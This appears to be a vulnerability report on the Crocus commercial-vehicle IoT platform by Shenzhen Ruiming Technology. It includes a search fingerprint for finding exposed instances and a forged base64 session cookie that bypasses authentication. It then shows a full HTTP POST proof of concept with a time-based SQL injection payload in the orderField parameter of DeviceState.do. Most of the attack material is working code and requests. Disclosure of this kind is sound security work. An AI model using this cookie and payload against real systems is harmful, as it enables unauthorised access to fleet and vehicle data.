# SQL Injection Vulnerability in the DeviceState.do Interface of Crocus System by Shenzhen Ruiming Technology Co., Ltd.

## Basic Information

### System Overview
As a provider of intelligent IoT (AIoT) solutions for commercial vehicles focusing on AI and video technologies, Shenzhen Ruiming Technology Co., Ltd. has the Crocus System as one of its core products. The Crocus System is designed to leverage artificial intelligence (AI), high-definition (HD) video, big data, and autonomous driving technologies to help commercial vehicles reduce traffic accidents and cargo loss, while improving the operational efficiency of enterprises or fleets.
<img width="2234" height="1040" alt="image" src="https://github.com/user-attachments/assets/91d5964d-7b13-41b0-8e93-3f6fd9be0aae" />

### System Fingerprint
`body="/ThirdResource/respond/respond.min.js" && title="Crocus"`

<img width="1595" height="1150" alt="image" src="https://github.com/user-attachments/assets/a0fe1cda-b99c-46af-a4ba-51f551c30cc8" />

## Vulnerability Exploitation

### Privilege Bypass

<img width="1911" height="1091" alt="image" src="https://github.com/user-attachments/assets/388ced0b-2c69-45c7-8502-2c752773dec8" />

We found the location where the Cookie is generated in `streamax.saffron.controller.registerlogin.RegisterLoginController#SetUserCookie`.
It can be seen that all its parameters are controllable by the user. The code is as follows:

```java
    private void SetUserCookie(int userID, String userName, String password, int roleID, String guid, String map, String ins, HttpServletResponse response) throws Exception {
        String cookieStr = "UID=%s&UN=%s&GID=%s&RID=%s&M=%s&INS=%s";
        if (!CommonFunction.validate(new String[]{map})) {
            map = "";
        }

        if (!CommonFunction.validate(new String[]{ins})) {
            ins = "0";
        }

        cookieStr = String.format(cookieStr, userID, userName, guid, roleID, map, ins);
        String base64 = (new BASE64Encoder()).encode(cookieStr.getBytes("utf-8"));
        base64 = base64.replaceAll("\r|\n", "");
        Cookie cookie = new Cookie("Saffron.U", base64);
        cookie.setMaxAge(-1);
        cookie.setPath("/");
        response.addCookie(cookie);
    }
```
Based on this, we can forge a Cookie:

```
Cookie:Saffron.U="VUlEPTEmR0lEPTE3NTk4MTczMjgyMzg0NyZSSUQ9MSZNPUdNYXAmSU5TPTA="
```
<img width="525" height="475" alt="image" src="https://github.com/user-attachments/assets/e6a4be9c-d171-4426-8af6-66be581cb523" />

At this point, we have bypassed the authentication of this system.

### SQL Injection Vulnerability
Since the target system uses MyBatis, we only need to search globally for `${` to find overlooked vulnerabilities.  
Fortunately, we found another one!

```xml
<mapper namespace="streamax.saffron.mapper.inters.operationstate.IDeviceStateMapper">
	<select id="queryLatestFromLast" parameterType="HashMap" resultType="DeviceStateInfo">
		select a.vehicleid,a.chipcode,a.carlicense,a.platecolor,a.deviceno,a.deviceType,a.identification,b.*,c.lat,c.lng,c.speed,c.direction,c.altitude,
		d.groupname,b.ip
		from  last_devicestate as b  join vehicledeviceinfo as a on a.chipcode=b.chipcode left join location as c on b.locationid=c.id inner join groupinfo as d on a.groupid=d.groupid
		<where>
			<if test="vehicleIdList.size()>0">
				a.vehicleId in 
				<foreach collection="vehicleIdList" item="vehicleId" separator="," open="(" close=")">
					#{vehicleId}
				</foreach>
			</if>
			<if test="field==null and value!=null">
  				and (a.chipcode like concat('%',#{value},'%') or a.carlicense like concat('%',#{value},'%') 
  				or a.deviceno like concat('%',#{value},'%') or a.devicetype like concat('%',#{value},'%')
  				or a.identification like concat('%',#{value},'%'))
  			</if>
  			<if test="field!=null and value!=null">
  				and a.${field} like concat('%',#{value},'%')
  			</if>
		</where>
		<if test="sortField!=null">
			 order by ${sortField}
			 <if test="sortType=='desc'">
			 	desc 
			 </if> 
		</if>
		<if test="startIndex>=0 and endIndex>=0" >
			limit #{startIndex},#{endIndex}
		</if>
	</select>
```

This is a typical **ORDER BY injection** vulnerability. We traced back to find the source point, which is located in `streamax.saffron.controller.operationstate.DeviceStateController#Query`:

```java
@RequestMapping(params = {"Action=Query"})
    @ResponseBody
    public Object Query(HttpServletRequest request, HttpServletResponse response) {
        int code = 200;
        int count = 0;
        List<DeviceStateInfo> result = new ArrayList<>();
        try {
            String groupId = request.getParameter("GroupId");
            String field = request.getParameter("Field");
            String value = request.getParameter("Value");
            String vehicleId = request.getParameter("VehicleId");
            String sortField = request.getParameter("orderField");
            String sortType = request.getParameter("orderType");
            new ArrayList();
            List<Integer> vehicleIdList = new ArrayList<>();
            if (CommonFunction.validate(groupId) && CommonFunction.stringToIntegerList(groupId).contains(1)) {
                vehicleIdList = new ArrayList<>();
            } else {
                if (groupId != null && !groupId.isEmpty()) {
                    List<Integer> groupIdList = this.service.getAllChildrenGroupId(CommonFunction.stringToIntegerList(groupId));
                    vehicleIdList.addAll(this.service.getAllVehicleId(groupIdList));
                }
                if (vehicleId != null && !vehicleId.isEmpty()) {
                    vehicleIdList.addAll(CommonFunction.stringToIntegerList(vehicleId));
                }
                if ((groupId == null || groupId.isEmpty()) && (vehicleId == null || vehicleId.isEmpty())) {
                    String uID = CommonFunction.getCookieInfo(request, "UID");
                    List<Integer> groupIdList2 = this.service.getUserAllGroupId(Integer.parseInt(uID));
                    vehicleIdList.addAll(this.service.getAllVehicleId(groupIdList2));
                }
                if (vehicleIdList == null || vehicleIdList.size() < 1) {
                    return CommonFunction.createResultMap(200, 0, new ArrayList());
                }
            }
            int page = new Integer(request.getParameter("PageIndex")).intValue();
            int rows = new Integer(request.getParameter("PageSize")).intValue();
            result = this.service.queryLatestFromLast(vehicleIdList, field, value, sortField, sortType, page, rows);
            count = this.service.getDeviceCountFromLast(vehicleIdList, field, value);
        } catch (Exception e) {
            code = 202;
            CommonFunction.writeExceptionLog("DeviceState", e);
        }
        return CommonFunction.createResultMap(code, count, result);
    }
```
<img width="2309" height="1356" alt="image" src="https://github.com/user-attachments/assets/c45f1781-69f2-49da-82c8-16eab44e67c8" />

We noticed that the `sortField` parameter is controllable by the user. Based on this, we constructed the following Proof of Concept (POC):

```
POST http://ip:port/DeviceState.do?Action=Query HTTP/1.1
Host: ip:port
Content-Length: 162
Cookie:Saffron.U="VUlEPTEmR0lEPTE3NTk4MTczMjgyMzg0NyZSSUQ9MSZNPUdNYXAmSU5TPTA="
Content-Type: application/x-www-form-urlencoded

EndTime=2024-08-20+00%3A00%3A00&PageIndex=0&PageSize=1&RepairState=-1&StartTime=2024-08-26+00%3A00%3A00&orderField=(select*from(select%0asleep(4))a)&orderType=asc
```

Due to network latency, we used **time difference** to verify the vulnerability. We first used `sleep(3)`, then `sleep(4)`, and finally `sleep(5)`, checking if the time difference between each test was around 1 second.


<img width="1925" height="885" alt="image" src="https://github.com/user-attachments/assets/f7cb57ce-e36c-4e11-90cb-80e2468e1961" />

<img width="1931" height="895" alt="image" src="https://github.com/user-attachments/assets/1e4fec64-6bc3-4362-bb6e-a730023ff9db" />

<img width="1939" height="895" alt="image" src="https://github.com/user-attachments/assets/bcd5b935-1a0d-4f85-996d-a539953fb0ae" />


It can be seen that the time difference between each test is around 1 second, which is sufficient to confirm that the `DeviceState.do?Action=Query` interface has an SQL injection vulnerability.

Thank you for your review! Wish you all the best!
